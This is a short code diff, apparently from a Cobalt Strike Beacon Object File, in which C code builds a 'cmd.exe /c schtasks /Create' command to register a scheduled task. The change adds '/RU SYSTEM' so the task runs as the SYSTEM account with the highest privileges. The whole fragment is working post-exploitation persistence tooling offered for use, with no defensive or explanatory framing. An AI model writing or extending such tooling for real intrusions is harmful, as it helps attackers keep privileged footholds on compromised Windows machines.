@@ -36,8 +36,9 @@ void go(char *args, int len)
         
         // Build schtasks command
         // /F = force (overwrite if exists)
+        // /RU SYSTEM = run as SYSTEM account
         // /RL HIGHEST = run with highest privileges
-        if (MSVCRT$sprintf(command, "cmd.exe /c schtasks /Create /F /TN \"%s\" /TR \"%s\" /SC %s /RL HIGHEST",
+        if (MSVCRT$sprintf(command, "cmd.exe /c schtasks /Create /F /TN \"%s\" /TR \"%s\" /SC %s /RU SYSTEM /RL HIGHEST",
                           taskName, programPath, trigger) < 0)
         {
             BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build command\n");
